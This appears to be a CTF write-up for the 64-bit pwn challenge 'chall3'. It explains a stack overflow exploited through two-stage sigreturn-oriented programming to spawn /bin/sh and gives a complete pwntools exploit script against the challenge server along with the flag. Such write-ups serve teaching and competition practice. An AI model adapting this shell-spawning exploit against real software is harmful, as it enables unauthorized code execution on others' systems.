# CTF Write-up — **chall3** (SROP without libc, using syscall gadgets)

## Title
- **Challenge:** `chall3`
- **Category:** pwn / 64-bit
- **Flag:** `V1T{w4k3c4ll_s1gr3t_8b21799b5ad6fb6faa570fcbf0a0dcf5}`

---

## Overview

A tiny 64-bit binary prints a line then **reads 1000 bytes into a 128-byte stack buffer**. There’s no convenient ret2libc (no easy `pop rdi; ret`, **Full RELRO**), but the binary exposes two perfect gadgets:

- `pop rax; ret`
- `syscall`

That’s enough for **SROP** (sigreturn-oriented programming). Plan:

1. Overflow, set `rax=15` (rt_sigreturn), `syscall` → kernel restores a **fake sigcontext** we placed on the stack.
2. That frame makes the kernel do `read(0, PIVOT, 0x400)`, sets `rsp=PIVOT`, and `rip=syscall`.
3. Second stage (read into `.bss` at `PIVOT`) performs another sigreturn to **execve("/bin/sh", 0, 0)**.

---

## Recon

```bash
$ file chall3
chall3: ELF 64-bit LSB executable, x86-64, dynamically linked

$ checksec chall3
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
64-bit

NX on

Full RELRO (GOT overwrite inconvenient)

No PIE (static code/data addresses)

No canary

Source-like pseudocode:
```
```c

int main() {
    char buf[128];
    puts("Quack off, I’m debugging my reflection in the pond.");
    read(0, buf, 1000);   // overflow
    return 0;
}
```
### Overflow control: 128 (buf) + 8 (saved RBP) = 136 bytes to reach saved RIP.

### Why not just ret2libc?
- No handy pop rdi; ret gadget.

- Full RELRO: no easy GOT hijack.

- NX: can’t run shellcode on the stack.

- But we do have:

- pop rax; ret at 0x4011ef

- syscall at 0x4011f1

### → That screams SROP.

### SROP refresher (super short)
On Linux x86-64, rax = 15 + syscall invokes rt_sigreturn. The kernel expects a sigcontext on the stack and will restore all registers from it:

rax, rdi, rsi, rdx, rsp, rip, …

So: if we can set rax=15 and execute syscall, and place a fake SigreturnFrame right after our payload, the kernel will give us full register control.

## Exploit plan (two-stage SROP)
### Stage 1 (on the stack)
- Overflow 136 bytes to control RIP.

- pop rax; ret → rax=15

- syscall → rt_sigreturn

- Fake frame (immediately after) requests:

- read(0, PIVOT, 0x400) (place stage 2 at PIVOT)

- rsp = PIVOT (stack pivot to .bss)

- rip = syscall (so the next ret hits a syscall site cleanly)

-Trick: write the second stage exactly to the memory that will become the new stack (PIVOT). When read returns, the subsequent ret will consume what we just wrote.

### Stage 2 (read into .bss)
- Starts with: pop rax; ret → 15 → syscall

- Followed by a second SigreturnFrame that sets up:

- execve("/bin/sh", 0, 0) via syscall

- Append the string "/bin/sh\0" at the end of the buffer.

### Final exploit code
```python

from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

elf = ELF("./chall3", checksec=False)
rop = ROP(elf)

# gadgets
pop_rax_ret = rop.find_gadget(["pop rax", "ret"])
pop_rax_ret = pop_rax_ret.address if pop_rax_ret else 0x4011ef

syscall = rop.find_gadget(["syscall"])
syscall = syscall.address if syscall else 0x4011f1

# controlled memory
bss    = elf.bss()
pivot  = bss + 0x200     # stage-2 buffer & future stack
binsh  = bss + 0x380     # place for "/bin/sh"

offset = 136  # 128 buf + 8 rbp

# --- Stage 1: trigger SROP, ask kernel to read stage-2 into pivot, pivot stack there ---
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_read   # read
frame1.rdi = 0                    # fd = stdin
frame1.rsi = pivot                # buf
frame1.rdx = 0x400                # count
frame1.rsp = pivot                # future stack
frame1.rip = syscall              # do the read

payload1  = b"A" * offset
payload1 += p64(pop_rax_ret)      # rax = 15 (rt_sigreturn)
payload1 += p64(15)
payload1 += p64(syscall)          # invoke rt_sigreturn
payload1 += bytes(frame1)         # fake frame (kernel will restore regs and do read)

# --- Stage 2: placed at pivot; executes immediately after read returns ---
stage2  = p64(pop_rax_ret) + p64(15) + p64(syscall)

frame2 = SigreturnFrame()
frame2.rax = constants.SYS_execve
frame2.rdi = binsh
frame2.rsi = 0
frame2.rdx = 0
frame2.rsp = pivot
frame2.rip = syscall              # make the syscall for execve

stage2 += bytes(frame2)
stage2  = stage2.ljust(binsh - pivot, b"\x00")
stage2 += b"/bin/sh\x00"

def main():
    p = remote("chall.v1t.site", 30211)

    # sync banner
    p.recvline()

    # send stage 1 (stack)
    p.send(payload1)

    # kernel is now blocking in read(0, pivot, 0x400)
    p.send(stage2)

    p.interactive()

if __name__ == "__main__":
    main()
```
Why it works
Single overflow → RIP control.

pop rax; ret + syscall → universal sigreturn primitive.

First frame makes a read into .bss and pivots the stack to that same memory.

When the read returns, the next ret consumes stage-2 (already at rsp).

Second frame sets up execve("/bin/sh",0,0) via syscall.

NX irrelevant (we’re making real syscalls).

Full RELRO irrelevant (we don’t touch GOT).

No PIE makes .bss/gadgets stable across local/remote.

Remote run
```text
$ python3 solve.py
...
$ id
$ cat flag
V1T{w4k3c4ll_s1gr3t_8b21799b5ad6fb6faa570fcbf0a0dcf5}
```